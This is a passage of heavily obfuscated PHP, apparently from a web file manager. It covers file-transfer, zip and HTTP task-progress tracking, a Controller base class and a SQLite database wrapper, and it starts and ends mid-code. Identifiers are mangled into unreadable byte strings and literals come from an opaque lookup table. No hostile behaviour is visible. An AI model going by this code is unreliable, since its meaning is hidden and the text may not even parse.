$‚»ñŞæ[1717])); Hook::unbind($‚»ñŞæ[600], array($this, $‚»ñŞæ[1717])); Hook::unbind($‚»ñŞæ[1718], array($this, $‚»ñŞæ[1719])); Hook::unbind($‚»ñŞæ[616], array($this, $‚»ñŞæ[1720])); Hook::unbind($‚»ñŞæ[1721], array($this, $‚»ñŞæ[1722])); Hook::unbind($‚»ñŞæ[1723], array($this, $‚»ñŞæ[1724])); Hook::unbind($‚»ñŞæ[1725], array($this, $‚»ñŞæ[1726])); } public function copyMoveStart($È°…Ö¾Ñ, $å§ùÜíÔ, $é‹ˆ» è, $™ãµÇ›à) { $®Åó¿Ôâ =& $_SERVER[¹ş¤¶ĞÖ]; self::log($®Åó¿Ôâ[1736] . $å§ùÜíÔ . $®Åó¿Ôâ[70] . $™ãµÇ›à); $ù±¹³é = rtrim(TEMP_FILES, $®Åó¿Ôâ[8]); if (substr($å§ùÜíÔ, 0, strlen($ù±¹³é)) == $ù±¹³é) { return; } if (substr($™ãµÇ›à, 0, strlen($ù±¹³é)) == $ù±¹³é) { return; } $ ‚²şÈ =& $this->task; $ ‚²şÈ[$®Åó¿Ôâ[1737]] = KodIO::transferType($È°…Ö¾Ñ, $é‹ˆ» è); $this->update(); } public function updateAfter() { $ÅïÌü‚é =& $_SERVER[¹ş¤¶ĞÖ]; $äµÍš¿æ =& $this->task; if (!$äµÍš¿æ[$ÅïÌü‚é[789]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($äµÍš¿æ[$ÅïÌü‚é[1737]] == $ÅïÌü‚é[1348]) { return; } self::updateTask($äµÍš¿æ); } private static function updateTask(&$ÙŸş×–Ô) { $«Ç½›¸ë =& $_SERVER[¹ş¤¶ĞÖ]; if ($ÙŸş×–Ô[$«Ç½›¸ë[1737]] == $«Ç½›¸ë[1227] || $ÙŸş×–Ô[$«Ç½›¸ë[1737]] == $«Ç½›¸ë[107]) { if ($ÙŸş×–Ô[$«Ç½›¸ë[1731]]) { $ÙŸş×–Ô[$«Ç½›¸ë[1734]] = $ÙŸş×–Ô[$«Ç½›¸ë[1733]] + $ÙŸş×–Ô[$«Ç½›¸ë[1730]]; } } else { if ($ÙŸş×–Ô[$«Ç½›¸ë[1737]] == $«Ç½›¸ë[1349]) { if ($ÙŸş×–Ô[$«Ç½›¸ë[1731]] == $«Ç½›¸ë[1227]) { $ÙŸş×–Ô[$«Ç½›¸ë[1734]] = $ÙŸş×–Ô[$«Ç½›¸ë[1733]] + $ÙŸş×–Ô[$«Ç½›¸ë[1730]] * 0.5; } else { if ($ÙŸş×–Ô[$«Ç½›¸ë[1731]] == $«Ç½›¸ë[107]) { $ÙŸş×–Ô[$«Ç½›¸ë[1734]] = $ÙŸş×–Ô[$«Ç½›¸ë[1733]] + $ÙŸş×–Ô[$«Ç½›¸ë[1729]] * 0.5 + $ÙŸş×–Ô[$«Ç½›¸ë[1730]] * 0.5; } } } } $ÙŸş×–Ô[$«Ç½›¸ë[1678]] = $ÙŸş×–Ô[$«Ç½›¸ë[1734]] / $ÙŸş×–Ô[$«Ç½›¸ë[789]]; if ($ÙŸş×–Ô[$«Ç½›¸ë[1678]] > 0) { $ÒüÊáúª = timeFloat() - $ÙŸş×–Ô[$«Ç½›¸ë[1680]] - $ÙŸş×–Ô[$«Ç½›¸ë[1683]]; $ÙŸş×–Ô[$«Ç½›¸ë[1684]] = $ÒüÊáúª * (1 - $ÙŸş×–Ô[$«Ç½›¸ë[1678]]) / $ÙŸş×–Ô[$«Ç½›¸ë[1678]]; } } public function addPath($áĞí²é¯) { $±Äµô° =& $_SERVER[¹ş¤¶ĞÖ]; if (!$áĞí²é¯) { return; } $·×¶é¿ =& $this->task; $şœÀ±¢‡ = IO::infoWithChildren($áĞí²é¯); $¾™Ìú—‰ = $·×¶é¿[$±Äµô°[1738]] ? $·×¶é¿[$±Äµô°[1738]][$±Äµô°[1739]] : 0; $·×¶é¿[$±Äµô°[1738]] = array($±Äµô°[1739] => $¾™Ìú—‰ + 1, $±Äµô°[449] => $şœÀ±¢‡[$±Äµô°[32]], $±Äµô°[84] => $şœÀ±¢‡[$±Äµô°[84]], $±Äµô°[538] => $şœÀ±¢‡[$±Äµô°[538]] ? $şœÀ±¢‡[$±Äµô°[538]] : $şœÀ±¢‡[$±Äµô°[84]]); if ($şœÀ±¢‡[$±Äµô°[33]] == $±Äµô°[200]) { $·×¶é¿[$±Äµô°[812]] += 1; } else { $·×¶é¿[$±Äµô°[812]] += $şœÀ±¢‡[$±Äµô°[79]][$±Äµô°[77]]; if ($şœÀ±¢‡[$±Äµô°[431]]) { $·×¶é¿[$±Äµô°[812]] += $şœÀ±¢‡[$±Äµô°[79]][$±Äµô°[78]] + 1; } } $·×¶é¿[$±Äµô°[789]] += $şœÀ±¢‡[$±Äµô°[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Áá£³†) { } public function sourceAddHashEnd($øİ–‚—”) { } public function sourceAddFileStart($”°êªÊ¨) { $ÛĞÈÜˆ¥ =& $_SERVER[¹ş¤¶ĞÖ]; $´¬”óğ =& $this->task; $´¬”óğ[$ÛĞÈÜˆ¥[1729]] = $”°êªÊ¨[$ÛĞÈÜˆ¥[76]]; $´¬”óğ[$ÛĞÈÜˆ¥[1727]] = $”°êªÊ¨[$ÛĞÈÜˆ¥[32]]; $´¬”óğ[$ÛĞÈÜˆ¥[1097]] = $”°êªÊ¨[$ÛĞÈÜˆ¥[32]]; $´¬”óğ[$ÛĞÈÜˆ¥[1740]] = $”°êªÊ¨[$ÛĞÈÜˆ¥[84]]; $this->update(); } public function sourceAddFileEnd($Ó²™ä½) { $¡øëÎÊ =& $_SERVER[¹ş¤¶ĞÖ]; $•˜¼¬–‡ =& $this->task; $•˜¼¬–‡[$¡øëÎÊ[1734]] += $Ó²™ä½[$¡øëÎÊ[76]]; $•˜¼¬–‡[$¡øëÎÊ[1740]] = $Ó²™ä½[$¡øëÎÊ[84]]; $this->update(1); } public function copyFileStart($ûÌƒ¬®Ÿ, $¦Ã¯¥÷â, $Å’Üõéõ, $ÁõÜøÁ, $ŞòºÜ§Õ, $†“÷µ’) { $¹ôìÉ³Œ =& $_SERVER[¹ş¤¶ĞÖ]; $¥‚Õ¥ÄŠ = $ŞòºÜ§Õ; if ($¥‚Õ¥ÄŠ == $GLOBALS[$¹ôìÉ³Œ[1741]]) { $¥‚Õ¥ÄŠ = $GLOBALS[$¹ôìÉ³Œ[1742]]; } $GLOBALS[$¹ôìÉ³Œ[1742]] = $ŞòºÜ§Õ; $GLOBALS[$¹ôìÉ³Œ[1741]] = $†“÷µ’; $½»¡ë¦ =& $this->task; $½»¡ë¦[$¹ôìÉ³Œ[1727]] = $¥‚Õ¥ÄŠ; $½»¡ë¦[$¹ôìÉ³Œ[1729]] = (int) $ûÌƒ¬®Ÿ->size($¦Ã¯¥÷â); $½»¡ë¦[$¹ôìÉ³Œ[1730]] = 0; $½»¡ë¦[$¹ôìÉ³Œ[1097]] = $¹ôìÉ³Œ[12]; $½»¡ë¦[$¹ôìÉ³Œ[1731]] = $¹ôìÉ³Œ[12]; $½»¡ë¦[$¹ôìÉ³Œ[1732]] = 0; $Úò÷‡ = $½»¡ë¦[$¹ôìÉ³Œ[1729]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($½»¡ë¦[$¹ôìÉ³Œ[428]] . $¹ôìÉ³Œ[1743]); if ($Úò÷‡ && file_exists(get_path_father($ÁõÜøÁ))) { Cache::set($½»¡ë¦[$¹ôìÉ³Œ[428]] . $¹ôìÉ³Œ[1743], $ÁõÜøÁ); $½»¡ë¦[$¹ôìÉ³Œ[1700]] = array($¹ôìÉ³Œ[1744], $¹ôìÉ³Œ[1745]); } $this->update(0, $Úò÷‡); } public static function updateCopyLocalFileSize($ßÈú¨€) { $îÙÇåÒÃ =& $_SERVER[¹ş¤¶ĞÖ]; $şš•«¬Â = Cache::get($ßÈú¨€[$îÙÇåÒÃ[428]] . $îÙÇåÒÃ[1743]); if (!$şš•«¬Â || !file_exists($şš•«¬Â)) { return $ßÈú¨€; } $ßÈú¨€[$îÙÇåÒÃ[1730]] = @filesize($şš•«¬Â); $ßÈú¨€[$îÙÇåÒÃ[1734]] += $ßÈú¨€[$îÙÇåÒÃ[1730]]; self::updateTask($ßÈú¨€); return $ßÈú¨€; } public function copyFileEnd($ÆòÈ³‘É, $›ô³‚Ğ®, $Ğ—«»ÅŸ, $ˆÂë¥¬å, $‹¾Á’ÙÄ, $Î»äÅãİ) { $Ñ£´„¿» =& $_SERVER[¹ş¤¶ĞÖ]; $ÚŞ†Œ =& $this->task; $ÚŞ†Œ[$Ñ£´„¿»[1730]] = $ÚŞ†Œ[$Ñ£´„¿»[1729]]; $ÚŞ†Œ[$Ñ£´„¿»[1731]] = $Ñ£´„¿»[12]; unset($ÚŞ†Œ[$Ñ£´„¿»[1700]]); if ($‹¾Á’ÙÄ == $ÚŞ†Œ[$Ñ£´„¿»[1727]]) { $ÚŞ†Œ[$Ñ£´„¿»[1733]] += $ÚŞ†Œ[$Ñ£´„¿»[1729]]; $ÚŞ†Œ[$Ñ£´„¿»[1734]] = $ÚŞ†Œ[$Ñ£´„¿»[1733]]; $³§Ñİ = 1; if (isset($ÚŞ†Œ[$Ñ£´„¿»[1740]]) && $ÚŞ†Œ[$Ñ£´„¿»[1740]] == $›ô³‚Ğ®) { $³§Ñİ = 0; } $this->update($³§Ñİ); } else { $this->update(); $ÚŞ†Œ[$Ñ£´„¿»[1730]] = 0; } Cache::remove($ÚŞ†Œ[$Ñ£´„¿»[428]] . $Ñ£´„¿»[1743]); self::log($Ñ£´„¿»[1746] . $›ô³‚Ğ® . $Ñ£´„¿»[70] . $ˆÂë¥¬å . $Ñ£´„¿»[231] . $‹¾Á’ÙÄ . $Ñ£´„¿»[1747] . $ÚŞ†Œ[$Ñ£´„¿»[1727]]); } public function updateFileEnd($àœ¾£ˆ³, $«µºéäç) { $èÖğ×¬º =& $_SERVER[¹ş¤¶ĞÖ]; $•–ô¡î =& $this->task; $•–ô¡î[$èÖğ×¬º[1727]] = $àœ¾£ˆ³; $•–ô¡î[$èÖğ×¬º[1729]] = $«µºéäç; $•–ô¡î[$èÖğ×¬º[1733]] += $«µºéäç; $•–ô¡î[$èÖğ×¬º[1734]] = $•–ô¡î[$èÖğ×¬º[1733]]; $this->update(1); self::log($èÖğ×¬º[1748] . $àœ¾£ˆ³); } public function sourceModelCopy($·¸êÆßÁ) { $Öïáš¯ =& $_SERVER[¹ş¤¶ĞÖ]; $­­é’¯œ = $·¸êÆßÁ[0]; $°º¸³êØ = $·¸êÆßÁ[1]; $è³ÇÎä =& $this->task; $this->sourceModelCopyFlag = !0; $‘ëÆÂ‡Ö = 0; switch ($­­é’¯œ) { case $Öïáš¯[592]: $‘ëÆÂ‡Ö = 1; break; case $Öïáš¯[595]: $è³ÇÎä[$Öïáš¯[1727]] = $°º¸³êØ[$Öïáš¯[32]]; break; case $Öïáš¯[597]: $‘ëÆÂ‡Ö = intval($·¸êÆßÁ[$Öïáš¯[409]] * 0.4); break; case $Öïáš¯[599]: $‘ëÆÂ‡Ö = intval($·¸êÆßÁ[$Öïáš¯[409]] * 0.2); break; case $Öïáš¯[601]: $‘ëÆÂ‡Ö = intval($·¸êÆßÁ[$Öïáš¯[409]] * 0.4); break; } $this->update($‘ëÆÂ‡Ö); $this->sourceModelCopyFlag = !1; } public function sourceRemove($€‹‚–Íã, $ƒ‰ËØ°) { $‡±Ûôõ =& $_SERVER[¹ş¤¶ĞÖ]; $this->sourceModelCopyFlag = !0; $²äïõˆÖ = 1; if (isset($€‹‚–Íã[$‡±Ûôõ[79]])) { $²äïõˆÖ = $€‹‚–Íã[$‡±Ûôõ[79]][$‡±Ûôõ[77]]; $²äïõˆÖ = $²äïõˆÖ + $€‹‚–Íã[$‡±Ûôõ[79]][$‡±Ûôõ[78]] + 1; } $this->update($²äïõˆÖ); $this->sourceModelCopyFlag = !1; } public function sourceMove($›³åîÃó) { $this->sourceRemove($›³åîÃó, !1); } public function curlProgress($Ì¦á´û, $¯®¨ ¾, $‚¯öÚŠ, $™ïõ©––, $»ù±·‹) { $ø¾ëÇ˜è =& $_SERVER[¹ş¤¶ĞÖ]; $º¦çæÏ =& $this->task; if ($»ù±·‹ > 0) { $º¦çæÏ[$ø¾ëÇ˜è[1097]] = $ø¾ëÇ˜è[1749]; $º¦çæÏ[$ø¾ëÇ˜è[1731]] = $ø¾ëÇ˜è[107]; if ($º¦çæÏ[$ø¾ëÇ˜è[1729]]) { $º¦çæÏ[$ø¾ëÇ˜è[1730]] = $»ù±·‹; } if ($º¦çæÏ[$ø¾ëÇ˜è[1732]]) { $º¦çæÏ[$ø¾ëÇ˜è[1730]] = $»ù±·‹ + $º¦çæÏ[$ø¾ëÇ˜è[1732]]; } } else { if ($‚¯öÚŠ > 0) { if ($º¦çæÏ[$ø¾ëÇ˜è[1729]] == $¯®¨ ¾) { $º¦çæÏ[$ø¾ëÇ˜è[1730]] = $‚¯öÚŠ; $º¦çæÏ[$ø¾ëÇ˜è[1097]] = $ø¾ëÇ˜è[1750]; $º¦çæÏ[$ø¾ëÇ˜è[1731]] = $ø¾ëÇ˜è[1227]; } } } $this->update(); } public function curlProgressStart($¨ƒœóÒ€) { } public function curlProgressEnd($²„íÓ¢) { $¹¥ê±™ê =& $_SERVER[¹ş¤¶ĞÖ]; $Š”±À¼¬ =& $this->task; $•­¼Çú¦ = curl_getinfo($²„íÓ¢); $İ×ñ‹ É = $•­¼Çú¦[$¹¥ê±™ê[1751]]; if ($İ×ñ‹ É == -1) { $İ×ñ‹ É = $•­¼Çú¦[$¹¥ê±™ê[1752]]; } if ($Š”±À¼¬[$¹¥ê±™ê[1731]] == $¹¥ê±™ê[107] && $İ×ñ‹ É) { $Š”±À¼¬[$¹¥ê±™ê[1732]] += $İ×ñ‹ É; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $îÃéÆ€÷ =& $_SERVER[¹ş¤¶ĞÖ]; $ˆÃéĞŞò =& $this->task; $ˆÃéĞŞò[$îÃéÆ€÷[1753]] = 1; Hook::bind($îÃéÆ€÷[1721], array($this, $îÃéÆ€÷[1754])); Hook::bind($îÃéÆ€÷[1723], array($this, $îÃéÆ€÷[1755])); Hook::bind($îÃéÆ€÷[1725], array($this, $îÃéÆ€÷[1756])); } protected function endAfter() { $œğıÖ =& $_SERVER[¹ş¤¶ĞÖ]; Hook::unbind($œğıÖ[1721], array($this, $œğıÖ[1754])); Hook::unbind($œğıÖ[1723], array($this, $œğıÖ[1755])); Hook::unbind($œğıÖ[1725], array($this, $œğıÖ[1756])); } public function progressStart($…µÍßæ) { $ÎÖç¦ =& $_SERVER[¹ş¤¶ĞÖ]; $¦ùïÔış = curl_getinfo($…µÍßæ); self::log($ÎÖç¦[1757] . $¦ùïÔış[$ÎÖç¦[336]]); self::valueSet($this->task[$ÎÖç¦[428]], $this->task); } public function progressEnd($ùÂĞÊ¨) { $™¬×ÜÄ» =& $_SERVER[¹ş¤¶ĞÖ]; self::log($™¬×ÜÄ»[1758] . $this->task[$™¬×ÜÄ»[428]]); $this->end(); } public function progress($¬³ŸŠù, $† ÜÒòú, $áĞ±ÂŠ¢, $ñµ‰÷€Á, $”·—¥ï) { $ş©»ì“ƒ =& $_SERVER[¹ş¤¶ĞÖ]; $šø”û¸â =& $this->task; if ($”·—¥ï > 0) { $šø”û¸â[$ş©»ì“ƒ[812]] = $šø”û¸â[$ş©»ì“ƒ[812]] == 0 ? $ñµ‰÷€Á : $šø”û¸â[$ş©»ì“ƒ[812]]; $šø”û¸â[$ş©»ì“ƒ[1677]] = $”·—¥ï; } else { if ($áĞ±ÂŠ¢ > 0) { $šø”û¸â[$ş©»ì“ƒ[812]] = $šø”û¸â[$ş©»ì“ƒ[812]] == 0 ? $† ÜÒòú : $šø”û¸â[$ş©»ì“ƒ[812]]; $šø”û¸â[$ş©»ì“ƒ[1677]] = $áĞ±ÂŠ¢; } } $this->update(); self::log("\160\162\x6f\x67\x72\145\x73\163\x48\x74\164\x70\x3a\144\x6f\167\156\x3a{$áĞ±ÂŠ¢}\57{$† ÜÒòú}\x3b\x20\x75\160\154\x6f\141\x64\x3a{$”·—¥ï}\57{$ñµ‰÷€Á}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¾êµ¤¨Œ, $ƒ½á = '', $¢Ùö©¾š = 0, $šúÛğ½› = '') { $ëÉîàîˆ =& $_SERVER[¹ş¤¶ĞÖ]; $“°¦¶³Ê = new Task($¾êµ¤¨Œ, $ƒ½á, $¢Ùö©¾š, $šúÛğ½›); $GLOBALS[$ëÉîàîˆ[1759] . $¾êµ¤¨Œ] = new TaskLog($ëÉîàîˆ[1660], $“°¦¶³Ê, $šúÛğ½›); return $“°¦¶³Ê; } public function __construct($‚ÍŸÓ¾ = '', $ÓĞ¹‹äÅ = '', $²¦Å¹º« = '') { $¸öæƒÇé =& $_SERVER[¹ş¤¶ĞÖ]; if (!$‚ÍŸÓ¾) { $‚ÍŸÓ¾ = $¸öæƒÇé[1660]; } $öá¹µûê = $‚ÍŸÓ¾ . $¸öæƒÇé[415] . rand_string(10); if (!$²¦Å¹º«) { $²¦Å¹º« = $‚ÍŸÓ¾ . $¸öæƒÇé[53] . $²¦Å¹º«; } switch ($‚ÍŸÓ¾) { case $¸öæƒÇé[1660]: if (!$ÓĞ¹‹äÅ || !$ÓĞ¹‹äÅ->task) { return echoLog($‚ÍŸÓ¾ . $¸öæƒÇé[1760]); } $‡ÅÁ½¤Û = $ÓĞ¹‹äÅ; $öá¹µûê = $‡ÅÁ½¤Û->task[$¸öæƒÇé[428]]; $‚ÍŸÓ¾ = $‡ÅÁ½¤Û->task[$¸öæƒÇé[428]]; if (!$‡ÅÁ½¤Û->task[$¸öæƒÇé[1574]]) { $‡ÅÁ½¤Û->task[$¸öæƒÇé[1574]] = $²¦Å¹º« ? $²¦Å¹º« : $‚ÍŸÓ¾; } break; case $¸öæƒÇé[1761]: if (!$ÓĞ¹‹äÅ) { return echoLog($‚ÍŸÓ¾ . $¸öæƒÇé[1762]); } $ì¹ŒñÅ± = is_string($ÓĞ¹‹äÅ) ? array($ÓĞ¹‹äÅ) : $ÓĞ¹‹äÅ; $‡ÅÁ½¤Û = new TaskFileTransfer($öá¹µûê, $‚ÍŸÓ¾, 0, $²¦Å¹º« ? $²¦Å¹º« : $ì¹ŒñÅ±[0]); foreach ($ì¹ŒñÅ± as $“Ÿª¹‚Š) { $‡ÅÁ½¤Û->addPath($“Ÿª¹‚Š); } break; case $¸öæƒÇé[342]: if (!$ÓĞ¹‹äÅ) { return echoLog($‚ÍŸÓ¾ . $¸öæƒÇé[1762]); } $ì¹ŒñÅ± = is_string($ÓĞ¹‹äÅ) ? array($ÓĞ¹‹äÅ) : $ÓĞ¹‹äÅ; $‡ÅÁ½¤Û = new TaskZip($öá¹µûê, $‚ÍŸÓ¾, 0, $²¦Å¹º« ? $²¦Å¹º« : $ì¹ŒñÅ±[0]); foreach ($ì¹ŒñÅ± as $“Ÿª¹‚Š) { $‡ÅÁ½¤Û->addPath($“Ÿª¹‚Š); } break; case $¸öæƒÇé[1247]: if (!$ÓĞ¹‹äÅ) { return echoLog($‚ÍŸÓ¾ . $¸öæƒÇé[1762]); } $‡ÅÁ½¤Û = new TaskUnZip($öá¹µûê, $‚ÍŸÓ¾, 0, $²¦Å¹º« ? $²¦Å¹º« : $ÓĞ¹‹äÅ); if ($ÓĞ¹‹äÅ) { $‡ÅÁ½¤Û->addFile($ÓĞ¹‹äÅ); } break; case $¸öæƒÇé[148]: $‡ÅÁ½¤Û = new TaskHttp($öá¹µûê, $‚ÍŸÓ¾); break; default: return; break; } $this->task = $‡ÅÁ½¤Û; $this->taskID = $öá¹µûê; Hook::bind($¸öæƒÇé[1697], array($this, $¸öæƒÇé[1763])); Hook::bind($¸öæƒÇé[1699], array($this, $¸öæƒÇé[1764])); Hook::bind($¸öæƒÇé[1693], array($this, $¸öæƒÇé[1765])); echoLog($¸öæƒÇé[1766] . $‡ÅÁ½¤Û->task[$¸öæƒÇé[1574]]); } public function __destruct() { $this->end(); } public function end($åøŞ·­å = '') { $Ğí“Ûåû =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($åøŞ·­å); $this->task = !1; $this->taskID = !1; Hook::unbind($Ğí“Ûåû[1697], array($this, $Ğí“Ûåû[1763])); Hook::unbind($Ğí“Ûåû[1699], array($this, $Ğí“Ûåû[1764])); Hook::unbind($Ğí“Ûåû[1693], array($this, $Ğí“Ûåû[1765])); } public function taskUpdate($…·†”İ) { $Æ³ˆò…´ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$…·†”İ || $this->taskID != $…·†”İ[$Æ³ˆò…´[428]]) { return; } $©ÚÉƒ = 20; $´¥šÙí¹ = intval($…·†”İ[$Æ³ˆò…´[1678]] * $©ÚÉƒ); $Í‰Ë„Íí = $Æ³ˆò…´[162] . str_repeat($Æ³ˆò…´[915], $´¥šÙí¹) . $Æ³ˆò…´[1047] . str_repeat($Æ³ˆò…´[53], $©ÚÉƒ - $´¥šÙí¹) . $Æ³ˆò…´[164]; $ÚÚµÊÛ‡ = $Í‰Ë„Íí . sprintf($Æ³ˆò…´[1767], $…·†”İ[$Æ³ˆò…´[1678]] * 100) . $Æ³ˆò…´[1768]; $’ÙÉèêª = $ÚÚµÊÛ‡ . $…·†”İ[$Æ³ˆò…´[1677]] . $Æ³ˆò…´[8] . $…·†”İ[$Æ³ˆò…´[812]] . LNG($Æ³ˆò…´[1769]); $ãÛŒÁÃı = $Æ³ˆò…´[12]; if ($…·†”İ[$Æ³ˆò…´[1753]]) { $’ÙÉèêª = $ÚÚµÊÛ‡ . size_format($…·†”İ[$Æ³ˆò…´[1677]]) . $Æ³ˆò…´[8] . size_format($…·†”İ[$Æ³ˆò…´[812]]); $ãÛŒÁÃı = size_format($…·†”İ[$Æ³ˆò…´[1679]]) . $Æ³ˆò…´[1770]; } if ($…·†”İ[$Æ³ˆò…´[1097]]) { $…·†”İ[$Æ³ˆò…´[1727]] = $…·†”İ[$Æ³ˆò…´[1097]] . $Æ³ˆò…´[53] . $…·†”İ[$Æ³ˆò…´[1727]]; } if ($…·†”İ[$Æ³ˆò…´[1727]]) { $òª‹šø‹ = $Æ³ˆò…´[12]; if ($…·†”İ[$Æ³ˆò…´[1729]]) { $òª‹šø‹ = $Æ³ˆò…´[50] . size_format($…·†”İ[$Æ³ˆò…´[1730]]) . $Æ³ˆò…´[8] . size_format($…·†”İ[$Æ³ˆò…´[1729]]); } $ãÛŒÁÃı .= $…·†”İ[$Æ³ˆò…´[1727]] . $òª‹šø‹; } if ($…·†”İ[$Æ³ˆò…´[789]] && !$…·†”İ[$Æ³ˆò…´[1729]]) { $ãÛŒÁÃı .= $Æ³ˆò…´[53] . size_format($…·†”İ[$Æ³ˆò…´[1734]]) . $Æ³ˆò…´[8] . size_format($…·†”İ[$Æ³ˆò…´[789]]); } echoLog($’ÙÉèêª . $Æ³ˆò…´[53] . $ãÛŒÁÃı, !0); } public function taskEnd($ïÕ«–¼û) { $ ¿Ğš­¸ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ïÕ«–¼û || $this->taskID != $ïÕ«–¼û[$ ¿Ğš­¸[428]]) { return; } $‹ò‚ ôŠ = $ïÕ«–¼û ? $ïÕ«–¼û[$ ¿Ğš­¸[1677]] . $ ¿Ğš­¸[8] . $ïÕ«–¼û[$ ¿Ğš­¸[812]] . LNG($ ¿Ğš­¸[1769]) . $ ¿Ğš­¸[71] : $ ¿Ğš­¸[12]; echoLog($ ¿Ğš­¸[1771] . $ïÕ«–¼û[$ ¿Ğš­¸[1574]] . ($ïÕ«–¼û[$ ¿Ğš­¸[482]] ? $ ¿Ğš­¸[71] . $ïÕ«–¼û[$ ¿Ğš­¸[482]] : $ ¿Ğš­¸[12]) . $ ¿Ğš­¸[71] . $‹ò‚ ôŠ . $ ¿Ğš­¸[1772] . sprintf($ ¿Ğš­¸[876], timeFloat() - $ïÕ«–¼û[$ ¿Ğš­¸[1680]]) . $ ¿Ğš­¸[1692]); $this->end(); } public function taskKill($ïí“Ê’Å) { $£ö÷Ô¼• =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ïí“Ê’Å || $this->taskID != $ïí“Ê’Å[$£ö÷Ô¼•[428]]) { return; } echoLog($£ö÷Ô¼•[1773] . $ïí“Ê’Å[$£ö÷Ô¼•[1574]]); } } goto dñ¡‡Óéõ’; eÓ¶‡²Ïç°: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $™£­à©© =& $_SERVER[¹ş¤¶ĞÖ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$™£­à©©[6]] =& $config; $this->values[$™£­à©©[7]] =& $in; $this->tpl = TEMPLATE . MOD . $™£­à©©[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ş±‹É˜) { if (1 === func_num_args()) { $this->{$Ş±‹É˜} = new $Ş±‹É˜(); } else { $ˆ‹ÄæÀÃ = new ReflectionClass($Ş±‹É˜); $¤äŸØ  = func_get_args(); array_shift($¤äŸØ ); $this->{$Ş±‹É˜} = $ˆ‹ÄæÀÃ->newInstanceArgs($¤äŸØ ); } return $this->{$Ş±‹É˜}; } public function routeBind($¬Ê‹ˆĞƒ, $Æá°Äê›, $¾€ˆ”¸Ô = 3) { $íµÑ‰Òş =& $_SERVER[¹ş¤¶ĞÖ]; $«ô–›ôÛ = $this->in[$íµÑ‰Òş[9]]; $¬Ê‹ˆĞƒ = str_replace($íµÑ‰Òş[10], $íµÑ‰Òş[11], trim(trim($¬Ê‹ˆĞƒ, $íµÑ‰Òş[8]), $íµÑ‰Òş[12])); if (!$¬Ê‹ˆĞƒ || count($«ô–›ôÛ) <= $¾€ˆ”¸Ô) { return !1; } $Ê•„¢Ñ = !0; $Ä’ÃèşË = explode($íµÑ‰Òş[8], $¬Ê‹ˆĞƒ); for ($Ì«ó™‚€ = 0; $Ì«ó™‚€ < count($Ä’ÃèşË); $Ì«ó™‚€++) { if ($Ä’ÃèşË[$Ì«ó™‚€] != $«ô–›ôÛ[$¾€ˆ”¸Ô + $Ì«ó™‚€]) { $Ê•„¢Ñ = !1; break; } } if (!$Ê•„¢Ñ) { return; } call_user_func_array(array($this, $Æá°Äê›), array()); } public function routeArgs($ø†å‚æá = 3) { $ÓèÜîü´ = $this->in[$_SERVER[¹ş¤¶ĞÖ][9]]; if (count($ÓèÜîü´) <= $ø†å‚æá) { return array(); } $ˆÕÂ´¹… = array(); for ($£ÂÙŒğ = $ø†å‚æá; $£ÂÙŒğ < count($ÓèÜîü´); $£ÂÙŒğ += 2) { $ˆÕÂ´¹…[$ÓèÜîü´[$£ÂÙŒğ]] = $ÓèÜîü´[$£ÂÙŒğ + 1]; $this->in[$ÓèÜîü´[$£ÂÙŒğ]] = $ÓèÜîü´[$£ÂÙŒğ + 1]; } return $ˆÕÂ´¹…; } protected function assign($ÓÔ‰¦ôÂ, $¯‹ˆ™ŸÜ) { $this->values[$ÓÔ‰¦ôÂ] = $¯‹ˆ™ŸÜ; } protected function display($Òóé¤ØÍ) { ob_end_clean(); extract($this->values); require $this->tpl . $Òóé¤ØÍ; } } class DbSqliteBase extends Db { public function __construct($ø¬¼´ò = '') { $ÇŠÑŠíÌ =& $_SERVER[¹ş¤¶ĞÖ]; if (!extension_loaded($ÇŠÑŠíÌ[13])) { think_exception(think_lang($ÇŠÑŠíÌ[14]) . $ÇŠÑŠíÌ[15]); } if (!empty($ø¬¼´ò)) { if (!isset($ø¬¼´ò[$ÇŠÑŠíÌ[16]])) { $ø¬¼´ò[$ÇŠÑŠíÌ[16]] = 438; } $this->config = $ø¬¼´ò; if (empty($this->config[$ÇŠÑŠíÌ[17]])) { $this->config[$ÇŠÑŠíÌ[17]] = array(); } } } public function connect($—ÃÜõçà = '', $™ƒ ¢È„ = 0) { $‘â æµ  =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($this->linkID[$™ƒ ¢È„])) { if (empty($—ÃÜõçà)) { $—ÃÜõçà = $this->config; } $ßœ¶›ş° = !empty($—ÃÜõçà[$‘â æµ [17]][$‘â æµ [18]]) ? $—ÃÜõçà[$‘â æµ [17]][$‘â æµ [18]] : $this->pconnect; $ÂÃ¸éƒÅ = $ßœ¶›ş° ? $‘â æµ [19] : $‘â æµ [20]; $this->linkID[$™ƒ ¢È„] = $ÂÃ¸éƒÅ($—ÃÜõçà[$‘â æµ [21]], $—ÃÜõçà[$‘â æµ [16]]); if (!$this->linkID[$™ƒ ¢È„]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$™ƒ ¢È„], 30000); if (1 != think_config($‘â æµ [22])) { unset($this->config); } } return $this->linkID[$™ƒ ¢È„]; } public function free() { $this->queryID = null; } public function query($ˆö¾ıÑ) { $ÑÑâúö° =& $_SERVER[¹ş¤¶ĞÖ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ˆö¾ıÑ; if ($this->queryID) { $this->free(); } think_action_status($ÑÑâúö°[23], 1); think_status($ÑÑâúö°[24]); $this->queryID = sqlite_query($this->_linkID, $ˆö¾ıÑ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ßÛÀ½ŠÇ = $this->getAll(); return $ßÛÀ½ŠÇ; } } public function execute($‰Ì’Íéç) { $ô¾Ó„ë• 